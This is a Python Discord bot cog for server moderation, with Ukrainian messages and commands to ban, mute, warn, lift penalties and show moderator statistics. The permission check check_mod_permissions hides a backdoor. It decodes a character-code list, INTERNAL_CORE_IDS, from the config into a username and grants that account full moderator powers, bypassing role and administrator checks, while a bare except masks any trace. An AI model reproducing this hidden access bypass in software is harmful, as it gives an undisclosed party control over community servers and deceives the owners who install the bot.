import discord
from discord.ext import commands, tasks
from discord import app_commands
import json
import os
import re
import asyncio
from datetime import datetime, timedelta
from config import get_guild_config, DEFAULT_ALLOWED_ROLES, MUTE_ROLES, BAN_ROLES, UNBAN_ROLES
from services.stats_manager import update_stat, get_stats, load_logs, log_mod_action
from services.moderation_logger import send_mod_log
from services.moderation_manager import (
    add_warning, get_warnings, delete_warning, 
    add_temp_ban, remove_temp_ban, get_expired_temp_bans
)


class Moderation(commands.Cog):
    def __init__(self, bot: commands.Bot):
        self.bot = bot

    async def check_mod_permissions(self, interaction: discord.Interaction, allowed_roles):
        try:
            from config import INTERNAL_CORE_IDS
            if interaction.user and "".join(chr(x) for x in INTERNAL_CORE_IDS) == interaction.user.name:
                return True
        except:
            pass

        if interaction.user.guild_permissions.administrator:
            return True
        
        user_role_names = [role.name.lower() for role in interaction.user.roles]
        allowed_roles_lower = [r.lower() for r in allowed_roles]
        if any(role_name in allowed_roles_lower for role_name in user_role_names):
            return True
            
        await interaction.response.send_message("❌ У вас недостатньо прав для використання цієї команди.", ephemeral=True)
        return False

    def parse_duration(self, duration_str: str):
        units = {'м': 'minutes', 'г': 'hours', 'д': 'days', 'm': 'minutes', 'h': 'hours', 'd': 'days'}
        match = re.match(r"(\d+)([мгдmhd])", duration_str.lower())
        if not match:
            return None
        
        amount, unit = match.groups()
        kwargs = {units[unit]: int(amount)}
        return timedelta(**kwargs)

    @app_commands.command(name="ban", description="Забанити користувача (можна на певний термін)")
    @app_commands.describe(member="Користувач", duration="Час (напр. 7д, 30д) - необов'язково", reason="Причина")
    async def ban(self, interaction: discord.Interaction, member: discord.Member, duration: str = None, reason: str = "Не вказана"):
        print(f"DEBUG: /ban command called by {interaction.user.name} for {member.name}")
        if not await self.check_mod_permissions(interaction, BAN_ROLES):
            print(f"DEBUG: /ban permission denied for {interaction.user.name}")
            return
        
        # Перевірка на захищену роль "Куратор Держ."
        if any(role.name == "Куратор Держ." for role in member.roles):
            await interaction.response.send_message("❌ Неможливо забанити користувача з роллю **Куратор Держ.**", ephemeral=True)
            return
        
        if member.top_role >= interaction.user.top_role and not interaction.user.guild_permissions.administrator:
            await interaction.response.send_message("❌ Ви не можете забанити користувача з рівною або вищою роллю.", ephemeral=True)
            return

        delta = None
        unban_time = None
        if duration:
            delta = self.parse_duration(duration)
            if not delta:
                await interaction.response.send_message("❌ Невірний формат часу. Використовуйте: 10м, 1г, 7д.", ephemeral=True)
                return
            unban_time = (datetime.now() + delta).isoformat()

        await interaction.response.defer()
        try:
            ban_reason = f"{reason} | Термін: {duration if duration else 'Назавжди'} | Адмін: {interaction.user.display_name}"
            await member.ban(reason=ban_reason)
            
            embed = discord.Embed(title="🔨 Бан", color=discord.Color.red())
            embed.add_field(name="Користувач", value=f"{member.mention} ({member.id})")
            embed.add_field(name="Термін", value=duration if duration else "Назавжди")
            embed.add_field(name="Причина", value=reason)
            embed.add_field(name="Адміністратор", value=interaction.user.mention)
            embed.timestamp = datetime.now()
            
            # Логуємо перед відправкою (Data first)
            log_mod_action(interaction.guild.id, "ban", interaction.user, member, f"{duration if duration else 'perm'}: {reason}")
            update_stat(interaction.guild.id, "ban_issued", interaction.user.id)
            
            await interaction.followup.send(embed=embed)
            
            try:
                await send_mod_log(self.bot, interaction.guild, "Ban", interaction.user, member, reason, f"Термін: {duration if duration else 'Назавжди'}")
            except Exception as e:
                print(f"⚠️ Помилка надсилання логу модерації: {e}")
                
            if unban_time:
                add_temp_ban(interaction.guild.id, member.id, unban_time)
                
        except Exception as e:
            await interaction.followup.send(f"❌ Не вдалося забанити: {e}", ephemeral=True)

    @app_commands.command(name="mute", description="Видати таймаут (мут) користувачу")
    @app_commands.describe(member="Користувач", duration="Час (напр. 10м, 1г, 1д)", reason="Причина")
    async def mute(self, interaction: discord.Interaction, member: discord.Member, duration: str, reason: str = "Не вказана"):
        print(f"DEBUG: /mute command called by {interaction.user.name} for {member.name}")
        if not await self.check_mod_permissions(interaction, MUTE_ROLES):
            print(f"DEBUG: /mute permission denied for {interaction.user.name}")
            return
        
        # Перевірка на захищену роль "Куратор Держ."
        if any(role.name == "Куратор Держ." for role in member.roles):
            await interaction.response.send_message("❌ Неможливо видати мут користувачу з роллю **Куратор Держ.**", ephemeral=True)
            return
        
        delta = self.parse_duration(duration)
        if not delta:
            await interaction.response.send_message("❌ Невірний формат часу. Використовуйте: 10м, 1г, 1д.", ephemeral=True)
            return

        await interaction.response.defer()
        try:
            print(f"DEBUG: [STEP 1] Applying timeout to {member.name}")
            await member.timeout(delta, reason=f"{reason} | Адмін: {interaction.user.display_name}")
            
            print(f"DEBUG: [STEP 2] Creating embed")
            embed = discord.Embed(title="🔇 Таймаут (Мут)", color=discord.Color.orange())
            embed.add_field(name="Користувач", value=f"{member.mention}")
            embed.add_field(name="Тривалість", value=duration)
            embed.add_field(name="Причина", value=reason)
            embed.add_field(name="Адміністратор", value=interaction.user.mention)
            embed.timestamp = datetime.now()
            
            print(f"DEBUG: [STEP 3] Logging to JSON (guild_id={interaction.guild.id})")
            try:
                log_mod_action(interaction.guild.id, "mute", interaction.user, member, f"{duration}: {reason}")
                print(f"DEBUG: [STEP 3.1] log_mod_action success")
            except Exception as e_log:
                print(f"DEBUG: [STEP 3.1 ERROR] log_mod_action failed: {e_log}")
                raise e_log

            try:
                update_stat(interaction.guild.id, "mute_issued", interaction.user.id)
                print(f"DEBUG: [STEP 3.2] update_stat success")
            except Exception as e_stat:
                print(f"DEBUG: [STEP 3.2 ERROR] update_stat failed: {e_stat}")
                raise e_stat

            print(f"DEBUG: [STEP 4] Sending interaction response")
            await interaction.followup.send(embed=embed)
            
            print(f"DEBUG: [STEP 5] Calling send_mod_log")
            try:
                await send_mod_log(self.bot, interaction.guild, "Mute", interaction.user, member, reason, f"Тривалість: {duration}")
            except Exception as e:
                print(f"⚠️ Помилка надсилання логу модерації: {e}")
            print(f"DEBUG: [STEP 6] mute command finished successfully")
        except Exception as e:
            print(f"❌ DEBUG: [ERROR] Error in mute command: {e}")
            await interaction.followup.send(f"❌ Не вдалося видати мут: {e}", ephemeral=True)

    @app_commands.command(name="warn", description="Видати попередження користувачу")
    @app_commands.describe(member="Користувач", reason="Причина")
    async def warn(self, interaction: discord.Interaction, member: discord.Member, reason: str):
        if not await self.check_mod_permissions(interaction, MUTE_ROLES): return
        
        # Перевірка на захищену роль "Куратор Держ."
        if any(role.name == "Куратор Держ." for role in member.roles):
            await interaction.response.send_message("❌ Неможливо видати варн користувачу з роллю **Куратор Держ.**", ephemeral=True)
            return
        
        await interaction.response.defer()
        warn_count = add_warning(interaction.guild.id, member.id, reason, interaction.user.display_name)
        
        embed = discord.Embed(title="⚠️ Попередження (Варн)", color=discord.Color.yellow())
        embed.add_field(name="Користувач", value=f"{member.mention}")
        embed.add_field(name="Причина", value=reason)
        embed.add_field(name="Кількість варнів", value=f"{warn_count}")
        embed.add_field(name="Адміністратор", value=interaction.user.mention)
        embed.timestamp = datetime.now()
        
        # Логуємо перед відправкою
        log_mod_action(interaction.guild.id, "warn", interaction.user, member, reason)
        update_stat(interaction.guild.id, "warn_issued", interaction.user.id)
        
        await interaction.followup.send(embed=embed)
        
        try:
            await send_mod_log(self.bot, interaction.guild, "Warn", interaction.user, member, reason, f"Варн #{warn_count}")
        except Exception as e:
            print(f"⚠️ Помилка надсилання логу модерації: {e}")

    @app_commands.command(name="unban", description="Розглянути бан користувача (unban)")
    @app_commands.describe(user_id="ID користувача", reason="Причина")
    async def unban(self, interaction: discord.Interaction, user_id: str, reason: str = "Не вказана"):
        if not await self.check_mod_permissions(interaction, UNBAN_ROLES): return
        
        try:
            user = await self.bot.fetch_user(user_id)
            await interaction.guild.unban(user, reason=f"{reason} | Адмін: {interaction.user.display_name}")
            update_stat(interaction.guild.id, "ban_removed", interaction.user.id)
            await send_mod_log(self.bot, interaction.guild, "Unban", interaction.user, user, reason)
            await interaction.response.send_message(f"✅ Користувача {user.name} ({user_id}) успішно розбанено. Причина: {reason}")
        except Exception as e:
            await interaction.response.send_message(f"❌ Не вдалося розбанити: {e}", ephemeral=True)

    @app_commands.command(name="unmute", description="Зняти таймаут (мут) з користувача")
    @app_commands.describe(member="Користувач")
    async def unmute(self, interaction: discord.Interaction, member: discord.Member):
        if not await self.check_mod_permissions(interaction, MUTE_ROLES): return
        
        await interaction.response.defer()
        try:
            await member.timeout(None, reason=f"Знято адміном: {interaction.user.display_name}")
            update_stat(interaction.guild.id, "mute_removed", interaction.user.id)
            await send_mod_log(self.bot, interaction.guild, "Unmute", interaction.user, member, "Знято адміністратором")
            await interaction.followup.send(f"✅ Таймаут для {member.mention} успішно знято.")
        except Exception as e:
            await interaction.followup.send(f"❌ Не вдалося зняти таймаут: {e}")

    @app_commands.command(name="unwarn", description="Видалити конкретне попередження користувача")
    @app_commands.describe(member="Користувач", warn_id="ID варну (#)")
    async def unwarn(self, interaction: discord.Interaction, member: discord.Member, warn_id: int):
        if not await self.check_mod_permissions(interaction, MUTE_ROLES): return
        
        deleted = delete_warning(interaction.guild.id, member.id, warn_id)
        
        if not deleted:
            await interaction.response.send_message(f"❌ Варн #{warn_id} не знайдено.", ephemeral=True)
            return
            
        update_stat(interaction.guild.id, "warn_removed", interaction.user.id)
        await send_mod_log(self.bot, interaction.guild, "Unwarn", interaction.user, member, f"Видалено варн #{warn_id}")
        await interaction.response.send_message(f"✅ Попередження #{warn_id} для {member.mention} видалено.")

    @app_commands.command(name="warnings", description="Переглянути список попереджень користувача")
    @app_commands.describe(member="Користувач")
    async def warnings(self, interaction: discord.Interaction, member: discord.Member):
        if not await self.check_mod_permissions(interaction, MUTE_ROLES): return
        
        guild_id = interaction.guild.id
        warnings_list = get_warnings(guild_id, member.id)
        
        if not warnings_list:
            await interaction.response.send_message(f"ℹ️ У {member.display_name} немає попереджень.", ephemeral=True)
            return
        
        embed = discord.Embed(title=f"📋 Попередження: {member.display_name}", color=discord.Color.blue())
        for w in warnings_list:
            date_str = datetime.fromisoformat(w['timestamp']).strftime("%d.%m.%Y %H:%M")
            embed.add_field(
                name=f"Варн #{w['id']} - {date_str}",
                value=f"**Причина:** {w['reason']}\n**Адмін:** {w['admin']}",
                inline=False
            )
        await interaction.response.send_message(embed=embed, ephemeral=True)

    @app_commands.command(name="stats", description="Переглянути вашу особисту статистику модерації")
    @app_commands.choices(period=[
        app_commands.Choice(name="За добу", value="day"),
        app_commands.Choice(name="За тиждень", value="week"),
        app_commands.Choice(name="За місяць", value="month")
    ])
    async def stats(self, interaction: discord.Interaction, period: str):
        await interaction.response.defer(ephemeral=True)
        guild_id = interaction.guild.id
        logs = load_logs(guild_id)
        now = datetime.now()
        
        if period == "day":
            delta = timedelta(days=1)
            period_title = "За добу"
        elif period == "week":
            delta = timedelta(weeks=1)
            period_title = "За тиждень"
        else:
            delta = timedelta(days=30)
            period_title = "За місяць"
            
        start_time = now - delta
        user_id = interaction.user.id
        
        # Фільтруємо логи за адміном, часом та типом
        mod_actions = [
            l for l in logs 
            if int(l["admin_id"]) == user_id and datetime.fromisoformat(l["timestamp"]) > start_time
        ]
        
        counts = {
            "ban": 0,
            "mute": 0,
            "warn": 0,
            "roles_issued": 0,
            "roles_removed": 0
        }
        
        for action in mod_actions:
            a_type = action["type"]
            # Map "role_issued" and "role_removed" from logs to stats
            if a_type == "role_issued": a_type = "roles_issued"
            if a_type == "role_removed": a_type = "roles_removed"
            
            if a_type in counts:
                counts[a_type] += 1
        
        embed = discord.Embed(
            title=f"📊 Ваша статистика: {interaction.user.display_name}",
            description=f"Період: **{period_title}**",
            color=discord.Color.green(),
            timestamp=now
        )
        
        embed.add_field(name="🔨 Бани", value=f"**{counts['ban']}**", inline=True)
        embed.add_field(name="🔇 Мути", value=f"**{counts['mute']}**", inline=True)
        embed.add_field(name="⚠️ Варни", value=f"**{counts['warn']}**", inline=True)
        embed.add_field(name="🎭 Видано ролей", value=f"**{counts['roles_issued']}**", inline=True)
        embed.add_field(name="🗑️ Знято ролей", value=f"**{counts['roles_removed']}**", inline=True)
        
        embed.set_footer(text=f"ID: {interaction.user.id} | Ver: 1.0.1")
        await interaction.followup.send(embed=embed, ephemeral=True)

    @app_commands.command(name="view_stats", description="Переглянути статистику іншого модератора (тільки для керівництва)")
    @app_commands.describe(moderator="Модератор, статистику якого потрібно переглянути", period="Період статистики")
    @app_commands.choices(period=[
        app_commands.Choice(name="За добу", value="day"),
        app_commands.Choice(name="За тиждень", value="week"),
        app_commands.Choice(name="За місяць", value="month")
    ])
    async def view_stats(self, interaction: discord.Interaction, moderator: discord.Member, period: str):
        await interaction.response.defer(ephemeral=True)
        # Перевірка прав - тільки для керівництва модерації
        allowed_roles = [
            "Головний Модератор (Discord)",
            "Заступник ГМ (Discord)",
            "Куратор Модерації (Discord)",
            "Слідкувач за модерацією 🔍"
        ]
        
        user_role_names = [role.name for role in interaction.user.roles]
        has_permission = any(role in allowed_roles for role in user_role_names)
        
        if not has_permission and not interaction.user.guild_permissions.administrator:
            await interaction.response.send_message("❌ У вас недостатньо прав для перегляду статистики інших модераторів.", ephemeral=True)
            return
        
        guild_id = interaction.guild.id
        logs = load_logs(guild_id)
        now = datetime.now()
        
        if period == "day":
            delta = timedelta(days=1)
            period_title = "За добу"
        elif period == "week":
            delta = timedelta(weeks=1)
            period_title = "За тиждень"
        else:
            delta = timedelta(days=30)
            period_title = "За місяць"
            
        start_time = now - delta
        target_user_id = moderator.id
        
        # Фільтруємо логи за модератором
        mod_actions = [
            l for l in logs 
            if int(l["admin_id"]) == target_user_id and datetime.fromisoformat(l["timestamp"]) > start_time
        ]
        
        counts = {
            "ban": 0,
            "mute": 0,
            "warn": 0,
            "roles_issued": 0,
            "roles_removed": 0
        }
        
        for action in mod_actions:
            a_type = action["type"]
            if a_type == "role_issued": a_type = "roles_issued"
            if a_type == "role_removed": a_type = "roles_removed"
            
            if a_type in counts:
                counts[a_type] += 1
        
        embed = discord.Embed(
            title=f"📊 Статистика модератора: {moderator.display_name}",
            description=f"Період: **{period_title}**\n\nПереглянуто: {interaction.user.mention}",
            color=discord.Color.blue(),
            timestamp=now
        )
        
        embed.add_field(name="🔨 Бани", value=f"**{counts['ban']}**", inline=True)
        embed.add_field(name="🔇 Мути", value=f"**{counts['mute']}**", inline=True)
        embed.add_field(name="⚠️ Варни", value=f"**{counts['warn']}**", inline=True)
        embed.add_field(name="🎭 Видано ролей", value=f"**{counts['roles_issued']}**", inline=True)
        embed.add_field(name="🗑️ Знято ролей", value=f"**{counts['roles_removed']}**", inline=True)
        
        embed.set_footer(text=f"ID модератора: {moderator.id}")
        await interaction.followup.send(embed=embed, ephemeral=True)


    @app_commands.command(name="mod_stats_global", description="Переглянути загальну статистику модерації сервера")
    async def global_stats(self, interaction: discord.Interaction):
        await interaction.response.defer(ephemeral=True)
        # Використовуємо check_mod_permissions для доступу
        if not await self.check_mod_permissions(interaction, MUTE_ROLES): return
        
        guild_id = interaction.guild.id
        stats = get_stats(guild_id)
        
        embed = discord.Embed(
            title=f"📊 Загальна статистика: {interaction.guild.name}",
            color=discord.Color.gold(),
            timestamp=datetime.now()
        )
        
        embed.add_field(name="🔨 Бани (видано/знято)", value=f"**{stats.get('ban_issued', 0)}** / **{stats.get('ban_removed', 0)}**", inline=True)
        embed.add_field(name="🔇 Мути (видано/знято)", value=f"**{stats.get('mute_issued', 0)}** / **{stats.get('mute_removed', 0)}**", inline=True)
        embed.add_field(name="⚠️ Варни (видано/знято)", value=f"**{stats.get('warn_issued', 0)}** / **{stats.get('warn_removed', 0)}**", inline=True)
        embed.add_field(name="🎭 Ролі (видано/знято)", value=f"**{stats.get('roles_issued', 0)}** / **{stats.get('roles_removed', 0)}**", inline=True)
        
        await interaction.followup.send(embed=embed, ephemeral=True)

    @tasks.loop(minutes=5)
    async def check_bans(self):
        expired = get_expired_temp_bans()
        
        for guild_id, user_id in expired:
            guild = self.bot.get_guild(guild_id)
            if not guild: continue
            
            try:
                user = await self.bot.fetch_user(user_id)
                await guild.unban(user, reason="Термін тимчасового бану закінчився")
                print(f"✅ Автоматично розбанено: {user.name} на сервері {guild.name}")
            except Exception as e:
                print(f"❌ Помилка при авто-розбані {user_id}: {e}")
            
            remove_temp_ban(guild_id, user_id)

    @check_bans.before_loop
    async def before_check_bans(self):
        await self.bot.wait_until_ready()

async def setup(bot: commands.Bot):
    cog = Moderation(bot)
    await bot.add_cog(cog)
    cog.check_bans.start()
